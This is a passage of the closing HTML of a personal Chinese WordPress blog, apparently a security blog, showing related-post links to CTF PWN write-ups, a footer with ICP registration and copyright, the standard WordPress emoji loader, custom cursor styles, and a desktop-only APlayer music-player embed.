+							<div class="related-post-title clamp" clamp-line="3">N1CTF Junior 2026 1/2 &#8211;PWN部分wp</div>
+							<i class="related-post-arrow fa fa-chevron-right" aria-hidden="true"></i>
+							</div><img class="related-post-thumbnail lazyload" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAABBJREFUeNpi+P//PwNAgAEACPwC/tuiTRYAAAAASUVORK5CYII=" data-original="https://yhalo.cn/wp-content/uploads/2026/01/n1-26.png"/></a><a class="related-post-card" href="https://yhalo.cn/547/2024%e5%b9%b4%e7%be%8a%e5%9f%8e%e6%9d%af%e7%b2%a4%e6%b8%af%e6%be%b3%e5%a4%a7%e6%b9%be%e5%8c%ba%e7%bd%91%e7%bb%9c%e5%ae%89%e5%85%a8%e5%a4%a7%e8%b5%9bpwn%e5%a4%8d%e7%8e%b0/"><div class="related-post-card-container has-thumbnail">
+							<div class="related-post-title clamp" clamp-line="3">2024年“羊城杯”粤港澳大湾区网络安全大赛PWN部分wp</div>
+							<i class="related-post-arrow fa fa-chevron-right" aria-hidden="true"></i>
+							</div><img class="related-post-thumbnail lazyload" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAABBJREFUeNpi+P//PwNAgAEACPwC/tuiTRYAAAAASUVORK5CYII=" data-original="https://yhalo.cn/wp-content/uploads/2025/10/rBABC2bhaLiAbhRPAAAAAAAAAAA055.800x600.750x563.jpg"/></a></div></div>
+					<footer id="footer" class="site-footer card shadow-sm border-0">
+						<div style="text-align: center; line-height: 1.6;">
+
+  <div class="github-badge-big">
+    <span class="badge-subject">
+      <i class="fa fa-id-card"></i> 备案号
+    </span>
+
+    <!-- 萌 ICP 备案（个站萌数） -->
+    <a href="https://icp.gov.moe/?keyword=20259018" target="_blank" rel="noreferrer">
+      萌ICP备20259018号
+    </a>
+    |
+    <!-- 工信部 ICP 备案 -->
+    <a href="https://beian.miit.gov.cn/" target="_blank" rel="noreferrer">
+      琼ICP备2025063547号
+    </a>
+    |
+    <!-- 公安备案：图标 + 文本 -->
+    <a href="https://beian.mps.gov.cn/#/query/webSearch?code=46010002000855"
+       target="_blank" rel="noreferrer" style="display:inline-block; text-decoration:none;">
+      <img src="https://yhalo.cn/wp-content/uploads/2025/11/备案图标.png"
+           alt="琼公网安备46010002000855号"
+           style="width:20px; height:20px; vertical-align:middle; margin-right:4px;">
+      琼公网安备46010002000855号
+    </a>
+  </div>
+
+  <p style="margin:0; font: inherit;">
+    Copyright © 2025-2026 YHalo. All rights reserved.
+  </p>
+
+  <a href="/sitemap_index.xml">
+    <span class="iconfont">&#xec3f;</span> 网站地图
+  </a>
+<p style="margin:6px 0 0; font: inherit;">
+    本站环境基于
+    <a href="https://curl.qcloud.com/hD76d8Vp" target="_blank" rel="nofollow sponsored noopener noreferrer">
+      腾讯云
+    </a>
+    搭建
+  </p>
+</div>						<div>Theme <a href="https://github.com/solstice23/argon-theme" target="_blank"><strong>Argon</strong></a></div>
+					</footer>
+				</main>
+			</div>
+		</div>
+		<script src="https://yhalo.cn/wp-content/themes/argon/argontheme.js?v1.3.5"></script>
+						
+					<link rel="stylesheet" href="https://yhalo.cn/wp-content/themes/argon/assets/vendor/highlight/styles/vs2015.css">
+		
+	</div>
+</div>
+<script type="speculationrules">
+{"prefetch":[{"source":"document","where":{"and":[{"href_matches":"/*"},{"not":{"href_matches":["/wp-*.php","/wp-admin/*","/wp-content/uploads/*","/wp-content/*","/wp-content/plugins/*","/wp-content/themes/argon/*","/*\\?(.+)"]}},{"not":{"selector_matches":"a[rel~=\"nofollow\"]"}},{"not":{"selector_matches":".no-prefetch, .no-prefetch a"}}]},"eagerness":"conservative"}]}
+</script>
+<script id="wp-emoji-settings" type="application/json">
+{"baseUrl":"https://s.w.org/images/core/emoji/17.0.2/72x72/","ext":".png","svgUrl":"https://s.w.org/images/core/emoji/17.0.2/svg/","svgExt":".svg","source":{"concatemoji":"https://yhalo.cn/wp-includes/js/wp-emoji-release.min.js?ver=7.1.4"}}
+</script>
+<script type="module">
+/*! This file is auto-generated */
+var e="script#wp-emoji-settings",t=document.querySelector(e);if(!(t instanceof HTMLScriptElement))throw new Error("Element missing: "+e);const r=JSON.parse(t.text),s=(window._wpemojiSettings=r,"wpEmojiSettingsSupports"),o=["flag","emoji"];function i(e){try{var t={supportTests:e,timestamp:(new Date).valueOf()};sessionStorage.setItem(s,JSON.stringify(t))}catch(e){}}function c(e,t,n){e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(t,0,0);t=new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data);e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(n,0,0);const r=new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data);return t.every((e,t)=>e===r[t])}function p(e,t){e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(t,0,0);var n=e.getImageData(16,16,1,1);for(let e=0;e<n.data.length;e++)if(0!==n.data[e])return!1;return!0}function u(e,t,n,r){switch(t){case"flag":return n(e,"\ud83c\udff3\ufe0f\u200d\u26a7\ufe0f","\ud83c\udff3\ufe0f\u200b\u26a7\ufe0f")?!1:!n(e,"\ud83c\udde8\ud83c\uddf6","\ud83c\udde8\u200b\ud83c\uddf6")&&!n(e,"\ud83c\udff4\udb40\udc67\udb40\udc62\udb40\udc65\udb40\udc6e\udb40\udc67\udb40\udc7f","\ud83c\udff4\u200b\udb40\udc67\u200b\udb40\udc62\u200b\udb40\udc65\u200b\udb40\udc6e\u200b\udb40\udc67\u200b\udb40\udc7f");case"emoji":return!r(e,"\ud83e\u1fac8")}return!1}function f(e,t,n,r){let a;const s=(a="undefined"!=typeof WorkerGlobalScope&&self instanceof WorkerGlobalScope?new OffscreenCanvas(300,150):document.createElement("canvas")).getContext("2d",{willReadFrequently:!0}),o=(s.textBaseline="top",s.font="600 32px Arial",{});return e.forEach(e=>{o[e]=t(s,e,n,r)}),o}function a(e){var t=document.createElement("script");t.src=e,t.defer=!0,document.head.appendChild(t)}r.supports={everything:!0,everythingExceptFlag:!0},new Promise(t=>{let n=function(){try{var e=JSON.parse(sessionStorage.getItem(s));if("object"==typeof e&&"number"==typeof e.timestamp&&(new Date).valueOf()<e.timestamp+604800&&"object"==typeof e.supportTests)return e.supportTests}catch(e){}return null}();if(!n){if("undefined"!=typeof Worker&&"undefined"!=typeof OffscreenCanvas&&"undefined"!=typeof URL&&URL.createObjectURL&&"undefined"!=typeof Blob)try{var e="postMessage("+f.toString()+"("+[JSON.stringify(o),u.toString(),c.toString(),p.toString()].join(",")+"));",r=new Blob([e],{type:"text/javascript"});const a=new Worker(URL.createObjectURL(r),{name:"wpTestEmojiSupports"});return void(a.onmessage=e=>{i(n=e.data),a.terminate(),t(n)})}catch(e){}i(n=f(o,u,c,p))}t(n)}).then(e=>{for(const n in e)r.supports[n]=e[n],r.supports.everything=r.supports.everything&&r.supports[n],"flag"!==n&&(r.supports.everythingExceptFlag=r.supports.everythingExceptFlag&&r.supports[n]);var t;r.supports.everythingExceptFlag=r.supports.everythingExceptFlag&&!r.supports.flag,r.supports.everything||((t=r.source||{}).concatemoji?a(t.concatemoji):t.wpemoji&&t.twemoji&&(a(t.twemoji),a(t.wpemoji)))});
+//# sourceURL=https://yhalo.cn/wp-includes/js/wp-emoji-loader.min.js
+</script>
+</body>
+
+
+</html>
+
+
+<!-- =================================================================
+               自定义鼠标指针
+================================================================= -->
+<style type="text/css">
+.main-content img,body{cursor:url(https://yhalo.cn/wp-content/uploads/2026/02/cursor.cur),auto}.actions>div,.expand-done,.main-content figure>figcaption div,.navbar-above .navbar-nav .item,.navbar-searchicon,.navbar-slideicon,.photos .picture-details,.widget .ad-tag .click-close,a,button{cursor:url(https://yhalo.cn/wp-content/uploads/2026/02/Hand.cur),auto}blockquote,code,h1,h2,h3,h4,h5,h6,hr,input[type=text],li,p,td,textarea,th{cursor:url(https://yhalo.cn/wp-content/uploads/2026/02/IBeam.cur),auto}
+</style>
+
+
+
+
+
+
+
+
+<!-- =================================================================
+     APlayer 音乐播放器 (移动端禁用优化)
+================================================================= -->
+<script type="text/javascript">
+  const isMobileDevice = /Mobi|Android|iPhone|iPad|iPod|Windows Phone/i.test(navigator.userAgent);
+
+  if (!isMobileDevice) {
+    document.write(`
+      <!-- APlayer CSS -->
+      <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css">
+
+      <!-- APlayer -->
+      <script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"><\/script>
+
+      <!-- 使用自己的 Meting API -->
+      <script>
+        window.meting_api =
+          'https://music-api.yhalo.cn/api?server=:server&type=:type&id=:id&auth=:auth&r=:r';
+      <\/script>
+
+      <!-- MetingJS -->
+      <script src="https://cdn.jsdelivr.net/npm/meting@2.0.1/dist/Meting.min.js"><\/script>
+
+      <style>
+        #aplayer-wrapper {
+          position: fixed;
+          bottom: 20px;
+          left: 20px;
+          z-index: 9999;
+        }
+      <\/style>
+
+      <div id="aplayer-wrapper">
+        <meting-js
+          server="netease"
+          type="playlist"
+          id="2791573169"
+          fixed="true"
+          autoplay="false"
+          theme="white"
+          loop="all"
+          order="list"
+          volume="0.8"
+          list-folded="true">
+        <\/meting-js>
+      </div>
+    `);
+  }
+</script>
+
+  
+
+
+
+
+
+
+<!--
+Performance optimized by Redis Object Cache. Learn more: https://wprediscache.com
+
+使用 Predis (v2.4.0) 从 Redis 检索了 2400 个对象 (680 KB)。
+-->
